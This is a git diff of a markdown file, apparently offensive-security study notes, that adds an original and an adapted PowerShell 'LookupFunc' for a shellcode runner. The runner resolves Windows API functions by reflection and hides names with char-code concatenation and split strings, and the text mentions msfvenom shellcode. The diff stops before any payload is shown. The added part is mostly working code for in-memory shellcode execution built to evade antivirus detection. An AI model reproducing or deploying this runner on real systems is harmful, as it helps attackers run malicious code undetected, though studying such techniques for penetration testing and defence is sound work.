@@ -855,28 +855,56 @@ $MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
 
 We can also create a shellcode runner as seen below. Note that for this shellcode, we want to generate the shellcode in ps1 format (in this case using msfvenom).
 
+Noting that the `LookupFunc` function needed to be adapted. The original LookupFunc is below: 
+  <details>
+  <summary> LookupFunc </summary>
+
+  ``` powershell 
+  function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+  ```
+  </details>
+
+The below powershell will pop calc.exe
+
 ``` powershell
 function LookupFunc {
-    Param ($m, $f)
+    Param ($moduleName, $functionName)
 
-    $sys = ([char]83)+([char]121)+([char]115)+([char]116)+([char]101)+([char]109)+'.dll'
+    $sysdll = ([char]83)+([char]121)+([char]115)+([char]116)+([char]101)+([char]109)+'.dll'
+
+    $assembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
+        $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1].Equals($sysdll)
+    }
+
     $typeName = ([char]77)+([char]105)+([char]99)+([char]114)+([char]111)+([char]115)+([char]111)+([char]102)+([char]116)+'.'+
                 ([char]87)+([char]105)+([char]110)+([char]51)+([char]50)+'.'+
                 ([char]85)+([char]110)+([char]115)+([char]97)+([char]102)+([char]101)+
                 ([char]78)+([char]97)+([char]116)+([char]105)+([char]118)+([char]101)+
                 ([char]77)+([char]101)+([char]116)+([char]104)+([char]111)+([char]100)+([char]115)
 
-    $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq $sys }).GetType($typeName)
+    $type = $assembly.GetType($typeName)
 
     $methods = @()
-    $a.GetMethods() | ForEach-Object { if ($_.Name -eq ('Get'+'Proc'+'Address')) { $methods += $_ } }
+    $type.GetMethods() | ForEach-Object {
+        if ($_.Name -eq ('Get'+'Proc'+'Address')) {
+            $methods += $_
+        }
+    }
 
-    $getModHandle = $a.GetMethod(('Get'+'Module'+'Handle'))
-    $modHandle = $getModHandle.Invoke($null, @($m))
+    $getModuleHandleMethod = $type.GetMethod(('Get'+'Module'+'Handle'))
+    $moduleHandle = $getModuleHandleMethod.Invoke($null, @($moduleName))
 
-    $handleRef = New-Object System.Runtime.InteropServices.HandleRef $null, $modHandle
-
-    return $methods[0].Invoke($null, @($handleRef, $f))
+    return $methods[0].Invoke($null, @($moduleHandle, $functionName))
 }
 
 function getDelegateType {
